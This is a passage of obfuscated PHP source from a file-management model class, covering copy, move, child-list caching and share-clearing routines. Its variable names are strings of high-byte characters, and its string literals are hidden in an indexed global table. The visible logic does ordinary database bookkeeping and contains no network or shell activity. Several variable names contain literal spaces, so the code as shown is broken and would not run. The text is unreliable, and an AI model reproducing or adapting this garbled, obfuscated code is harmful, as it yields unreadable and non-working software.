($this->isParentOf($Ÿìó§±Ğ, $€ˆ÷’Ø¯)) { return !1; } $äéÃÒÏá = $ğö¦Ÿæ ? $ğö¦Ÿæ : $—çÔ÷ Ä[$ªˆãÂ[32]]; $this->lockCopyStart($Ÿìó§±Ğ); $this->lockWriteStart($€ˆ÷’Ø¯, $äéÃÒÏá); $‡á™ÔÈ = array($ªˆãÂ[629] => array(), $ªˆãÂ[630] => array(), $ªˆãÂ[631] => array()); $this->targetIsDelete = intval($—çÔ÷ Ä[$ªˆãÂ[505]]); $Äë³¬ = $this->fileNameExistAuto($€ˆ÷’Ø¯, $—çÔ÷ Ä); $­Éñ®¦á = $this->_copy($Ÿìó§±Ğ, $€ˆ÷’Ø¯, $Û€œÚßµ, $‡á™ÔÈ, !0, $ğö¦Ÿæ); $this->_childrenListClear(); $this->lockCopyEnd($Ÿìó§±Ğ); $this->lockWriteEnd($€ˆ÷’Ø¯, $äéÃÒÏá); if ($—çÔ÷ Ä[$ªˆãÂ[485]] == $ªˆãÂ[91] && $Äë³¬ == $­Éñ®¦á) { $this->folderSizeResetChildren($Äë³¬); } Model($ªˆãÂ[632])->addAll($‡á™ÔÈ[$ªˆãÂ[630]], array(), !0); if ($Äë³¬ != $­Éñ®¦á || $—çÔ÷ Ä[$ªˆãÂ[485]] == $ªˆãÂ[91]) { Model($ªˆãÂ[633])->eventCopy($­Éñ®¦á); } $this->saveAll($‡á™ÔÈ[$ªˆãÂ[631]]); Model($ªˆãÂ[230])->linkAdd($‡á™ÔÈ[$ªˆãÂ[629]]); $this->folderSizeReset($€ˆ÷’Ø¯); $this->updateModifyTime($€ˆ÷’Ø¯); return $­Éñ®¦á; } private function _copy($²×Ë¸Ï£, $‰ºÄû¹–, $²œæ¾É€, &$Ò´±öù, $ÄÉ‹ñÍ­, $­¥åü¤„ = '') { $ÊÁÓşû =& $_SERVER[¦»×‡Ãã]; $±”‡åéß = $this->sourceInfoCache($²×Ë¸Ï£); $½×¹¡ = $±”‡åéß[$ÊÁÓşû[485]] == $ÊÁÓşû[91]; $Õ¡ï£Ì = $­¥åü¤„ ? $­¥åü¤„ : $±”‡åéß[$ÊÁÓşû[32]]; $¨•Îİ“ = $this->fileNameExistAuto($‰ºÄû¹–, $±”‡åéß); if ($ÄÉ‹ñÍ­) { $this->_childrenAllMake($²×Ë¸Ï£); if ($½×¹¡ && $¨•Îİ“) { $this->_childrenAllMake($¨•Îİ“); } } if (!$¨•Îİ“) { return $this->_copyCreate($²×Ë¸Ï£, $‰ºÄû¹–, $Õ¡ï£Ì, $Ò´±öù); } $ÏïÕÄÔË = $¨•Îİ“; if ($½×¹¡) { if ($²œæ¾É€ == REPEAT_RENAME_FOLDER) { $Õ¡ï£Ì = $this->fileNameAutoCache($‰ºÄû¹–, $Õ¡ï£Ì, $²œæ¾É€, $½×¹¡); $ÏïÕÄÔË = $this->_copyCreate($²×Ë¸Ï£, $‰ºÄû¹–, $Õ¡ï£Ì, $Ò´±öù); } else { $¿’Ùä»‚ = $this->_childrenList($²×Ë¸Ï£); foreach ($¿’Ùä»‚ as $°´³ÒµŒ) { $this->_copy($°´³ÒµŒ[$ÊÁÓşû[193]], $¨•Îİ“, $²œæ¾É€, $Ò´±öù, !1); } } } else { if ($²œæ¾É€ == REPEAT_RENAME || $²œæ¾É€ == REPEAT_RENAME_FOLDER) { $Õ¡ï£Ì = $this->fileNameAutoCache($‰ºÄû¹–, $Õ¡ï£Ì, $²œæ¾É€, $½×¹¡); $ÏïÕÄÔË = $this->_copyCreate($²×Ë¸Ï£, $‰ºÄû¹–, $Õ¡ï£Ì, $Ò´±öù); } else { if ($²œæ¾É€ == REPEAT_REPLACE) { $×èÓ¥»ú = $this->sourceInfoCache($¨•Îİ“); $ ‰¥Ü = $this->fileHistory($×èÓ¥»ú, $±”‡åéß[$ÊÁÓşû[541]], $±”‡åéß[$ÊÁÓşû[79]]); if ($ ‰¥Ü) { $Ò´±öù[$ÊÁÓşû[629]][] = $±”‡åéß[$ÊÁÓşû[541]]; } } else { if ($²œæ¾É€ == REPEAT_SKIP) { } } } Hook::trigger($ÊÁÓşû[634], array($ÊÁÓşû[635], $±”‡åéß, 0)); } return $ÏïÕÄÔË; } private function _copyCreate($ÂÈÖÂˆë, $Şí¡ï“º, $€ÉüÆ¢¯, &$ğ’ºùİ) { $³¼öéà =& $_SERVER[¦»×‡Ãã]; $õé‚‚‚¾ = $this->sourceInfoCache($ÂÈÖÂˆë); $…‚µ¿© = $this->sourceInfoCache($Şí¡ï“º); $êåë—üà = $this->_makeItemData($õé‚‚‚¾, $…‚µ¿©, $€ÉüÆ¢¯); Hook::trigger($³¼öéà[636], $êåë—üà); Hook::trigger($³¼öéà[637], array($³¼öéà[638], $êåë—üà, 0)); $©ş¨†˜ = $this->add($êåë—üà); $ØÛ±‘‹ô = array($³¼öéà[193] => $©ş¨†˜, $³¼öéà[32] => $€ÉüÆ¢¯); $this->_copyApplyMeta($ØÛ±‘‹ô, $ğ’ºùİ); if ($õé‚‚‚¾[$³¼öéà[485]] != $³¼öéà[91]) { $ğ’ºùİ[$³¼öéà[629]][] = $õé‚‚‚¾[$³¼öéà[541]]; return $©ş¨†˜; } $”ÊÜ‚Úë = array(); $Óğ–°Ãı = array(); $this->_childrenListAll($ÂÈÖÂˆë, $”ÊÜ‚Úë); $ÚãÜˆ = count($”ÊÜ‚Úë); if ($ÚãÜˆ == 0) { return $©ş¨†˜; } $Ğ°ÄŞÓÛ = $this->sourceInfo($©ş¨†˜); foreach ($”ÊÜ‚Úë as $ııÎğæÖ) { $î©¨˜® = $this->_makeItemData($ııÎğæÖ, $Ğ°ÄŞÓÛ, $ııÎğæÖ[$³¼öéà[32]]); $î©¨˜®[$³¼öéà[584]] = $ııÎğæÖ[$³¼öéà[584]]; $Óğ–°Ãı[] = $î©¨˜®; } $this->chunkEventSet($³¼öéà[639], array($³¼öéà[640], $êåë—üà, $ÚãÜˆ)); $this->addAll($Óğ–°Ãı, array(), !1); $şÔƒÙ¬ = $this->where(array($³¼öéà[192] => $©ş¨†˜))->select(); $”Ÿˆäâ‚ = $this->_childrenMakeRelation($”ÊÜ‚Úë, $şÔƒÙ¬); $”Ÿˆäâ‚[$ÂÈÖÂˆë] = $©ş¨†˜; $Å‘»­ÇŸ = array(); $ÙåŒ° = array(); foreach ($şÔƒÙ¬ as $ııÎğæÖ) { $‹îŠù¢ = $ııÎğæÖ[$³¼öéà[193]]; $Ù£œÎ”• = $this->_childrenMatch($”Ÿˆäâ‚, $ııÎğæÖ, $Ğ°ÄŞÓÛ); $Å‘»­ÇŸ[] = array($³¼öéà[193], $‹îŠù¢, $³¼öéà[192], $Ù£œÎ”•[$³¼öéà[192]]); $ÙåŒ°[] = array($³¼öéà[193], $‹îŠù¢, $³¼öéà[584], $Ù£œÎ”•[$³¼öéà[584]]); $this->_copyApplyMeta($ııÎğæÖ, $ğ’ºùİ); if ($ııÎğæÖ[$³¼öéà[485]] != $³¼öéà[91]) { $ğ’ºùİ[$³¼öéà[629]][] = $ııÎğæÖ[$³¼öéà[541]]; } } $this->chunkEventSet($³¼öéà[641], array($³¼öéà[642], $êåë—üà, $ÚãÜˆ)); $this->saveAll($Å‘»­ÇŸ); $this->chunkEventSet($³¼öéà[643], array($³¼öéà[644], $êåë—üà, $ÚãÜˆ)); $this->saveAll($ÙåŒ°); return $©ş¨†˜; } private function _childrenMakeRelation($¨ê´¸ü, $øÖ‡ş¶¯) { $ñõ£“Ä× =& $_SERVER[¦»×‡Ãã]; $Áş°¢É– = array(); $Õ‡¡×’´ = array(); foreach ($¨ê´¸ü as $ Ï¾Ä™”) { $İÚİŸ¡ = $ Ï¾Ä™”[$ñõ£“Ä×[32]] . $ñõ£“Ä×[8] . $ Ï¾Ä™”[$ñõ£“Ä×[584]]; $Áş°¢É–[$İÚİŸ¡] = $ Ï¾Ä™”[$ñõ£“Ä×[193]]; } foreach ($øÖ‡ş¶¯ as $ Ï¾Ä™”) { $İÚİŸ¡ = $ Ï¾Ä™”[$ñõ£“Ä×[32]] . $ñõ£“Ä×[8] . $ Ï¾Ä™”[$ñõ£“Ä×[584]]; $¿é´è£é = $Áş°¢É–[$İÚİŸ¡]; $Õ‡¡×’´[$¿é´è£é] = $ Ï¾Ä™”[$ñõ£“Ä×[193]]; } return $Õ‡¡×’´; } private function _childrenMatch($ŠÈ³à’, $ªîÚŞ‡¬, $¥©­) { $‚é¤¸é =& $_SERVER[¦»×‡Ãã]; $¦ÕæâŞ = $¥©­[$‚é¤¸é[584]]; $°ù›ä› = $this->parentLevelArray($ªîÚŞ‡¬[$‚é¤¸é[584]]); foreach ($°ù›ä› as $Ö´Ô‰·•) { if (isset($ŠÈ³à’[$Ö´Ô‰·•])) { $¦ÕæâŞ .= $ŠÈ³à’[$Ö´Ô‰·•] . $‚é¤¸é[645]; } } $¦ÕæâŞ = rtrim($¦ÕæâŞ, $‚é¤¸é[50]) . $‚é¤¸é[50]; $Ê£¤ÆŞÀ = $this->parentLevelArray($¦ÕæâŞ); $†² ¬ = $Ê£¤ÆŞÀ[count($Ê£¤ÆŞÀ) - 1]; return array($‚é¤¸é[192] => $†² ¬, $‚é¤¸é[584] => $¦ÕæâŞ); } private function _makeItemData($–­—ñ¦·, $½„şÈâº, $«¿ÓÊÅÍ) { $å›·¬÷ë =& $_SERVER[¦»×‡Ãã]; $€åøå¶ï = array($å›·¬÷ë[646] => $–­—ñ¦·[$å›·¬÷ë[485]], $å›·¬÷ë[494] => $«¿ÓÊÅÍ, $å›·¬÷ë[647] => $–­—ñ¦·[$å›·¬÷ë[486]] ? $–­—ñ¦·[$å›·¬÷ë[486]] : $å›·¬÷ë[12], $å›·¬÷ë[542] => $–­—ñ¦·[$å›·¬÷ë[541]] ? $–­—ñ¦·[$å›·¬÷ë[541]] : 0, $å›·¬÷ë[617] => $–­—ñ¦·[$å›·¬÷ë[79]] ? $–­—ñ¦·[$å›·¬÷ë[79]] : 0, $å›·¬÷ë[648] => intval($½„şÈâº[$å›·¬÷ë[190]]), $å›·¬÷ë[649] => intval($½„şÈâº[$å›·¬÷ë[569]]), $å›·¬÷ë[650] => intval(USER_ID), $å›·¬÷ë[651] => intval(USER_ID), $å›·¬÷ë[477] => intval($½„şÈâº[$å›·¬÷ë[193]]), $å›·¬÷ë[652] => $½„şÈâº[$å›·¬÷ë[584]] . $½„şÈâº[$å›·¬÷ë[193]] . $å›·¬÷ë[50], $å›·¬÷ë[498] => $–­—ñ¦·[$å›·¬÷ë[88]] ? $–­—ñ¦·[$å›·¬÷ë[88]] : time(), $å›·¬÷ë[504] => 0, $å›·¬÷ë[653] => $å›·¬÷ë[12]); return $€åøå¶ï; } private function _copyApplyMeta($·î½·ôº, &$üÙÆÜÅ) { $ÖÁ¥¦ì =& $_SERVER[¦»×‡Ãã]; $Ê¨¥Æ½ = $·î½·ôº[$ÖÁ¥¦ì[193]]; $ÈœŒïâÓ = $·î½·ôº[$ÖÁ¥¦ì[32]]; if (!isset($·î½·ôº[$ÖÁ¥¦ì[654]]) || !$·î½·ôº[$ÖÁ¥¦ì[654]] || $·î½·ôº[$ÖÁ¥¦ì[654]] == $ÖÁ¥¦ì[228]) { $üÙÆÜÅ[$ÖÁ¥¦ì[631]][] = array($ÖÁ¥¦ì[193], $Ê¨¥Æ½, $ÖÁ¥¦ì[654], short_id($Ê¨¥Æ½)); } if (Input::check($ÈœŒïâÓ, $ÖÁ¥¦ì[655])) { $üÙÆÜÅ[$ÖÁ¥¦ì[630]][] = array($ÖÁ¥¦ì[193] => $Ê¨¥Æ½, $ÖÁ¥¦ì[97] => $ÖÁ¥¦ì[538], $ÖÁ¥¦ì[450] => str_replace($ÖÁ¥¦ì[53], $ÖÁ¥¦ì[12], Pinyin::get($ÈœŒïâÓ))); $üÙÆÜÅ[$ÖÁ¥¦ì[630]][] = array($ÖÁ¥¦ì[193] => $Ê¨¥Æ½, $ÖÁ¥¦ì[97] => $ÖÁ¥¦ì[537], $ÖÁ¥¦ì[450] => Pinyin::get($ÈœŒïâÓ, $ÖÁ¥¦ì[656])); } $üÙÆÜÅ[$ÖÁ¥¦ì[630]][] = array($ÖÁ¥¦ì[193] => $Ê¨¥Æ½, $ÖÁ¥¦ì[97] => $ÖÁ¥¦ì[517], $ÖÁ¥¦ì[450] => KodSort::makeStr($ÈœŒïâÓ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($»ì¯½˜—) { $‹Ì‹ó´ =& $_SERVER[¦»×‡Ãã]; $Ê¯ÁåÄ’ = $this->sourceInfo($»ì¯½˜—); $Î«Ú û = $‹Ì‹ó´[657]; $€™º˜÷ = array($‹Ì‹ó´[584] => array($‹Ì‹ó´[612], $Ê¯ÁåÄ’[$‹Ì‹ó´[584]] . $»ì¯½˜— . $‹Ì‹ó´[613]), $‹Ì‹ó´[505] => $this->targetIsDelete); $»£íŞÙ¨ = $this->field($Î«Ú û)->where($€™º˜÷)->select(); if (!$»£íŞÙ¨) { return; } $»£íŞÙ¨ = array_to_keyvalue($»£íŞÙ¨, $‹Ì‹ó´[193]); foreach ($»£íŞÙ¨ as $ÇŸéıŒó) { $Õøó®Ñ» = $ÇŸéıŒó[$‹Ì‹ó´[192]]; $»ì¯½˜— = $ÇŸéıŒó[$‹Ì‹ó´[193]]; if (!isset($this->_childrenListCache[$»ì¯½˜—]) && $ÇŸéıŒó[$‹Ì‹ó´[485]] == $‹Ì‹ó´[91]) { $this->_childrenListCache[$»ì¯½˜—] = array(); } if (!isset($this->_childrenListCache[$Õøó®Ñ»])) { $this->_childrenListCache[$Õøó®Ñ»] = array(); } $this->_childrenListCache[$Õøó®Ñ»][$»ì¯½˜—] = $ÇŸéıŒó; $this->_childrenItemCache[$»ì¯½˜—] = $ÇŸéıŒó; } } private function _childrenListAll($×ê×Êò­, &$Å¿š•ôÁ) { $ÌĞá˜®Ô =& $_SERVER[¦»×‡Ãã]; if (!isset($this->_childrenListCache[$×ê×Êò­])) { return; } $²â–ôÎµ = $this->_childrenListCache[$×ê×Êò­]; foreach ($²â–ôÎµ as $Ïİ—ŠÙ => $ñ†‰¨è) { $Å¿š•ôÁ[$Ïİ—ŠÙ] = $ñ†‰¨è; if ($ñ†‰¨è[$ÌĞá˜®Ô[485]] == $ÌĞá˜®Ô[91]) { $this->_childrenListAll($Ïİ—ŠÙ, $Å¿š•ôÁ); } } } private function sourceInfoCache($èÕå„ø×) { if (isset($this->_childrenItemCache[$èÕå„ø×])) { return $this->_childrenItemCache[$èÕå„ø×]; } return $this->sourceInfo($èÕå„ø×); } private function _childrenList($ËıûŠİà) { if (isset($this->_childrenListCache[$ËıûŠİà])) { return $this->_childrenListCache[$ËıûŠİà]; } return $this->_childrenListSelect($ËıûŠİà); } private function _childrenListSelect($¸¥ª”ø«) { $—ÖŒ‡ê× =& $_SERVER[¦»×‡Ãã]; $²¥âÒ¹ = array($—ÖŒ‡ê×[192] => $¸¥ª”ø«, $—ÖŒ‡ê×[505] => $this->targetIsDelete); $´ı‡˜„Ü = $this->where($²¥âÒ¹)->select(); $´ı‡˜„Ü = $´ı‡˜„Ü ? $´ı‡˜„Ü : array(); $Éµş‹‘€ = array_to_keyvalue($´ı‡˜„Ü, $—ÖŒ‡ê×[193]); $this->_childrenListCache[$¸¥ª”ø«] = $Éµş‹‘€; foreach ($Éµş‹‘€ as $¸¥ª”ø« => $«¹ñÅÄ) { $this->_childrenItemCache[$¸¥ª”ø«] = $«¹ñÅÄ; } return $Éµş‹‘€; } private function fileNameExistAuto($Ø‹ÈØ’†, $½ãÒ³°š) { $è·ø¥¤ =& $_SERVER[¦»×‡Ãã]; if ($½ãÒ³°š[$è·ø¥¤[505]] == $è·ø¥¤[91]) { return $this->fileNameExist($Ø‹ÈØ’†, $½ãÒ³°š[$è·ø¥¤[32]]); } return $this->fileNameExistCache($Ø‹ÈØ’†, $½ãÒ³°š[$è·ø¥¤[32]]); } private function fileNameExistCache($¶œ›´ÇÃ, $Œæˆşõ) { $ƒìµÙğß =& $_SERVER[¦»×‡Ãã]; $Œæˆşõ = strtolower($Œæˆşõ); $Í ß§ÁŒ = $this->_childrenList($¶œ›´ÇÃ); foreach ($Í ß§ÁŒ as $š¯Â²«¦) { if ($Œæˆşõ == strtolower($š¯Â²«¦[$ƒìµÙğß[32]])) { return $š¯Â²«¦[$ƒìµÙğß[193]]; } } return !1; } private function fileNameAutoCache($â“©ÎßÎ, $ò÷ŞæÕ¸, $õ•†‹Æà, $åºæƒùÌ) { $–Ë··‹Û =& $_SERVER[¦»×‡Ãã]; $˜±™ú¹ğ = $this->_childrenList($â“©ÎßÎ); $·é•êĞˆ = array_to_keyvalue($˜±™ú¹ğ, $–Ë··‹Û[12], $–Ë··‹Û[32]); return $this->fileNameAutoGet($·é•êĞˆ, $ò÷ŞæÕ¸, $õ•†‹Æà, $åºæƒùÌ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¹ä’”¤, $ŞšÑ¡×Ş, $ÚÍøì™æ = REPEAT_REPLACE, $´‘ŠÃÜæ = '') { $óá…Ğœº =& $_SERVER[¦»×‡Ãã]; $¦È†‹ = $this->sourceInfo($¹ä’”¤); $¶²¤ÊÑ = $this->sourceInfo($ŞšÑ¡×Ş); if ($¦È†‹[$óá…Ğœº[192]] == $¶²¤ÊÑ[$óá…Ğœº[193]]) { if ($¦È†‹[$óá…Ğœº[505]] == $óá…Ğœº[91]) { Model($óá…Ğœº[503])->restore(array($¹ä’”¤)); } if (!$´‘ŠÃÜæ || $´‘ŠÃÜæ == $¦È†‹[$óá…Ğœº[32]]) { return $¹ä’”¤; } } $‰‚‘¢„ = $this->pathInfoMore($¹ä’”¤); if ($this->isParentOf($¹ä’”¤, $ŞšÑ¡×Ş)) { return !1; } if (!$¦È†‹ || !$¶²¤ÊÑ || $¶²¤ÊÑ[$óá…Ğœº[485]] != $óá…Ğœº[91]) { return !1; } Hook::trigger($óá…Ğœº[658], $‰‚‘¢„); $this->targetIsDelete = intval($¦È†‹[$óá…Ğœº[505]]); if ($¦È†‹[$óá…Ğœº[192]] == $ŞšÑ¡×Ş && $´‘ŠÃÜæ != $¦È†‹[$óá…Ğœº[32]]) { $óÎòÓ…õ = $this->fileNameExist($ŞšÑ¡×Ş, $´‘ŠÃÜæ); if ($óÎòÓ…õ && $¦È†‹[$óá…Ğœº[485]] == $óá…Ğœº[228]) { $Ñ©ì¥ş² = $this->sourceInfo($óÎòÓ…õ); $µñÚÖ¼ï = $this->fileHistory($Ñ©ì¥ş², $¦È†‹[$óá…Ğœº[541]], $¦È†‹[$óá…Ğœº[79]]); if (!$µñÚÖ¼ï) { Model($óá…Ğœº[544])->remove($¦È†‹[$óá…Ğœº[541]]); } $this->removeNow($¹ä’”¤, !1); $this->folderSizeReset($ŞšÑ¡×Ş); Hook::trigger($óá…Ğœº[659], $‰‚‘¢„); return $óÎòÓ…õ; } } $ü³ªú‘ = $´‘ŠÃÜæ ? $´‘ŠÃÜæ : $¦È†‹[$óá…Ğœº[32]]; $this->lockMoveStart($¹ä’”¤); $this->lockWriteStart($ŞšÑ¡×Ş, $ü³ªú‘); $®é¯Æ‹÷ = array($óá…Ğœº[629] => array(), $óá…Ğœº[660] => !1); $this->clearShare($¹ä’”¤, $ŞšÑ¡×Ş); $İ¡°ÒÀ³ = $this->fileNameExistAuto($ŞšÑ¡×Ş, $¦È†‹); $Ö¤ ¼® = $this->_move($¹ä’”¤, $ŞšÑ¡×Ş, $ÚÍøì™æ, $®é¯Æ‹÷, $´‘ŠÃÜæ); $this->sourceCacheClear(); if ($¦È†‹[$óá…Ğœº[485]] == $óá…Ğœº[91] && $İ¡°ÒÀ³) { $this->folderSizeResetChildren($Ö¤ ¼®); } Model($óá…Ğœº[230])->linkAdd($®é¯Æ‹÷[$óá…Ğœº[629]]); if ($İ¡°ÒÀ³ && $®é¯Æ‹÷[$óá…Ğœº[660]]) { $this->removeNow($¹ä’”¤, !1); } $this->lockMoveEnd($¹ä’”¤); $this->lockWriteEnd($ŞšÑ¡×Ş, $ü³ªú‘); $this->folderSizeReset($¦È†‹[$óá…Ğœº[192]]); $this->folderSizeReset($ŞšÑ¡×Ş); $®¿ï€ø = array($¦È†‹[$óá…Ğœº[192]], $ŞšÑ¡×Ş); if ($¦È†‹[$óá…Ğœº[485]] == $óá…Ğœº[91]) { $®¿ï€ø[] = $¹ä’”¤; } $this->updateModifyTime($®¿ï€ø); Model($óá…Ğœº[633])->eventMove($¹ä’”¤, $¦È†‹[$óá…Ğœº[192]], $ŞšÑ¡×Ş); Hook::trigger($óá…Ğœº[659], $‰‚‘¢„); return $Ö¤ ¼®; } private function _move($À—ê©Ó¬, $‘µ˜„—€, $Ä³æ¬ˆ¼, &$…Ò¬ˆĞ¸, $¿éóöóÍ = '') { $šìåÉî¦ =& $_SERVER[¦»×‡Ãã]; $î¶…µÎ = $this->sourceInfo($À—ê©Ó¬); $§ß´¼àˆ = $î¶…µÎ[$šìåÉî¦[485]] == $šìåÉî¦[91]; $ãé»õĞæ = $¿éóöóÍ ? $¿éóöóÍ : $î¶…µÎ[$šìåÉî¦[32]]; $™Ññğ÷ = $this->fileNameExistAuto($‘µ˜„—€, $î¶…µÎ); $this->lockMoveStart($À—ê©Ó¬); $this->lockWriteStart($‘µ˜„—€, $ãé»õĞæ); if (!$™Ññğ÷) { return $this->_moveForce($À—ê©Ó¬, $‘µ˜„—€, $ãé»õĞæ); } $Õëßöü˜ = $™Ññğ÷; $„®º»¿œ = !1; if ($§ß´¼àˆ) { if ($Ä³æ¬ˆ¼ == REPEAT_RENAME_FOLDER) { $ãé»õĞæ = $this->fileNameAuto($‘µ˜„—€, $ãé»õĞæ, $Ä³æ¬ˆ¼, $§ß´¼àˆ); $Õëßöü˜ = $this->_moveForce($À—ê©Ó¬, $‘µ˜„—€, $ãé»õĞæ); } else { if ($Ä³æ¬ˆ¼ == REPEAT_RENAME_FOLDER) { $Ä³æ¬ˆ¼ = REPEAT_RENAME; } $ÚÄÛÀ¹Ç = $this->_childrenListSelect($À—ê©Ó¬); foreach ($ÚÄÛÀ¹Ç as $ µ‡‚àŒ) { $this->_move($ µ‡‚àŒ[$šìåÉî¦[193]], $™Ññğ÷, $Ä³æ¬ˆ¼, $…Ò¬ˆĞ¸); } $„®º»¿œ = !0; } } else { if ($Ä³æ¬ˆ¼ == REPEAT_SKIP) { $„®º»¿œ = !0; } else { if ($Ä³æ¬ˆ¼ == REPEAT_RENAME || $Ä³æ¬ˆ¼ == REPEAT_RENAME_FOLDER) { $ãé»õĞæ = $this->fileNameAuto($‘µ˜„—€, $ãé»õĞæ, $Ä³æ¬ˆ¼, $§ß´¼àˆ); $Õëßöü˜ = $this->_moveForce($À—ê©Ó¬, $‘µ˜„—€, $ãé»õĞæ); } else { if ($Ä³æ¬ˆ¼ == REPEAT_REPLACE) { $…­Üã’ = $this->sourceInfoCache($™Ññğ÷); $ÀóÙ—ŠÇ = $this->fileHistory($…­Üã’, $î¶…µÎ[$šìåÉî¦[541]], $î¶…µÎ[$šìåÉî¦[79]]); $„®º»¿œ = !0; if ($ÀóÙ—ŠÇ) { $…Ò¬ˆĞ¸[$šìåÉî¦[629]][] = $î¶…µÎ[$šìåÉî¦[541]]; } } } } } if ($„®º»¿œ && !$…Ò¬ˆĞ¸[$šìåÉî¦[660]]) { $…Ò¬ˆĞ¸[$šìåÉî¦[660]] = !0; } return $Õëßöü˜; } private function _moveForce($ï§¨ÕÌ, $ßÜÈĞ»ç, $ËŸ“ ‰ª) { $±›ü¨¦§ =& $_SERVER[¦»×‡Ãã]; $û¥Ùíø¶ = $this->sourceInfo($ï§¨ÕÌ); $ó¨Ü‰Ÿê = $this->sourceInfo($ßÜÈĞ»ç); $œû£àé€ = $û¥Ùíø¶[$±›ü¨¦§[485]] == $±›ü¨¦§[91]; $¤¨µÂ“† = array($±›ü¨¦§[477] => $ó¨Ü‰Ÿê[$±›ü¨¦§[193]], $±›ü¨¦§[652] => $ó¨Ü‰Ÿê[$±›ü¨¦§[584]] . $ó¨Ü‰Ÿê[$±›ü¨¦§[193]] . $±›ü¨¦§[50], $±›ü¨¦§[648] => $ó¨Ü‰Ÿê[$±›ü¨¦§[190]], $±›ü¨¦§[649] => $ó¨Ü‰Ÿê[$±›ü¨¦§[569]], $±›ü¨¦§[651] => USER_ID, $±›ü¨¦§[494] => $ËŸ“ ‰ª); $ÍÊ¼õŞï = $û¥Ùíø¶[$±›ü¨¦§[190]] == SourceModel::TYPE_GROUP && $ó¨Ü‰Ÿê[$±›ü¨¦§[190]] == SourceModel::TYPE_GROUP && $û¥Ùíø¶[$±›ü¨¦§[569]] == $ó¨Ü‰Ÿê[$±›ü¨¦§[569]]; if (!$ÍÊ¼õŞï && $this->moveClearAuth) { Model($±›ü¨¦§[567])->authClear($ï§¨ÕÌ); } $˜ô‘ÜÓá = $û¥Ùíø¶[$±›ü¨¦§[505]] == $±›ü¨¦§[91] && $ó¨Ü‰Ÿê[$±›ü¨¦§[505]] != $±›ü¨¦§[91]; if ($˜ô‘ÜÓá) { $¤¨µÂ“†[$±›ü¨¦§[504]] = 0; } if ($œû£àé€) { $ÆÅÁ¹ÓÀ = array($±›ü¨¦§[652] => array($±›ü¨¦§[612], $û¥Ùíø¶[$±›ü¨¦§[584]] . $û¥Ùíø¶[$±›ü¨¦§[193]] . $±›ü¨¦§[613])); $ª—÷ÙØš = $û¥Ùíø¶[$±›ü¨¦§[584]] . $û¥Ùíø¶[$±›ü¨¦§[193]] . $±›ü¨¦§[50]; $¼ÀÈñ½Ú = $ó¨Ü‰Ÿê[$±›ü¨¦§[584]] . $ó¨Ü‰Ÿê[$±›ü¨¦§[193]] . $±›ü¨¦§[50] . $û¥Ùíø¶[$±›ü¨¦§[193]] . $±›ü¨¦§[50]; $±ÅóÍà× = array($±›ü¨¦§[652] => array($±›ü¨¦§[661], "\x72\145\160\154\x61\143\x65\x28\x70\141\162\x65\156\x74\114\x65\x76\x65\x6c\x2c\47{$ª—÷ÙØš}\47\x2c\x27{$¼ÀÈñ½Ú}\47\51"), $±›ü¨¦§[648] => $ó¨Ü‰Ÿê[$±›ü¨¦§[190]], $±›ü¨¦§[649] => $ó¨Ü‰Ÿê[$±›ü¨¦§[569]]); if ($˜ô‘ÜÓá) { $±ÅóÍà×[$±›ü¨¦§[504]] = 0; } $this->where($ÆÅÁ¹ÓÀ)->data($±ÅóÍà×)->save(); } $this->where(array($±›ü¨¦§[491] => $ï§¨ÕÌ))->data($¤¨µÂ“†)->save(); return $ï§¨ÕÌ; } private function clearShare($‚¨„ˆ¾ğ, $ûê×ªŸË) { $¥Ôîëè¦ =& $_SERVER[¦»×‡Ãã]; $æÊ–öıö = $this->sourceInfo($‚¨„ˆ¾ğ); $«×ìû¾¦ = $this->sourceInfo($ûê×ªŸË); if ($æÊ–öıö[$¥Ôîëè¦[569]] == $«×ìû¾¦[$¥Ôîëè¦[569]] && $æÊ–öıö[$¥Ôîëè¦[190]] == $¥Ôîëè¦[662]) { return; } $í²€¶Ê = array($¥Ôîëè¦[584] => array($¥Ôîëè¦[612], $æÊ–öıö[$¥Ôîëè¦[584]] . $‚¨„ˆ¾ğ . $¥Ôîëè¦[613])); $şÆµÊ¥± = $this->field($¥Ôîëè¦[491])->where($í²€¶Ê)->getField($¥Ôîëè¦[193], !0); if (!$şÆµÊ¥±) { return; } $í²€¶Ê = array($¥Ôîëè¦[193] => array($¥Ôîëè¦[7], $şÆµÊ¥±), $¥Ôîëè¦[663] => 1); $î…ÛïÊ˜ = Model($¥Ôîëè¦[664])->field($¥Ôîëè¦[665])->where($í²€¶Ê)->select(); if (!$î…ÛïÊ˜) { return; } $î…ÛïÊ˜ = array_to_keyvalue($î…ÛïÊ˜, $¥Ôîëè¦[12], $¥Ôîëè¦[665]); $í²€¶Ê = array($¥Ôîëè¦[665] => array($¥Ôîëè¦[7], $î…ÛïÊ˜)); Model($¥Ôîëè¦[664])->where($í²€¶Ê)->save(array($¥Ôîëè¦[663] => 0)); Model($¥Ôîëè¦[666])->where($í²€¶Ê)->delete(); } public function copyFolderFromIO($Ê°³¯¿â, $äÈÇÛ¨€, $ìÍ×ïú›, $ÇŠ°ğÀ×, $ô†¥À©, $„×´í¡´ = false) { $¼é†µñØ =& $_SERVER[¦»×‡Ãã]; $¡éûÙ¿ = array($¼é†µñØ[630] => array(), $¼é†µñØ[631] => array(), $¼é†µñØ[629] => array(), $¼é†µñØ[667] => array()); $¨¼¿ñÉ = $„×´í¡´ ? $„×´í¡´ : $Ê°³¯¿â->pathThis($äÈÇÛ¨€); $ «á»™ = $this->fileNameExist($ìÍ×ïú›, $¨¼¿ñÉ); $ÀŠøºà¾ = $this->mkdir($ìÍ×ïú›, $¨¼¿ñÉ, $ÇŠ°ğÀ×); if (!$ «á»™ || $ÇŠ°ğÀ× == REPEAT_RENAME_FOLDER) { $ÇŠ°ğÀ× = !1; } if ($ «á»™) { $this->_childrenAllMake($ «á»™); } Hook::trigger($¼é†µñØ[668]); $this->_copyChildTo($Ê°³¯¿â, $äÈÇÛ¨€, $ÀŠøºà¾, $ÇŠ°ğÀ×, $¡éûÙ¿, $ô†¥À©); Hook::trigger($¼é†µñØ[669]); if ($ÀŠøºà¾) { $this->folderSizeResetChildren($ÀŠøºà¾); } $this->_childrenListClear(); Model($¼é†µñØ[632])->addAll($¡éûÙ¿[$¼é†µñØ[630]], array(), !0); Model($¼é†µñØ[633])->eventCopy($ÀŠøºà¾); $this->saveAll($¡éûÙ¿[$¼é†µñØ[631]]); 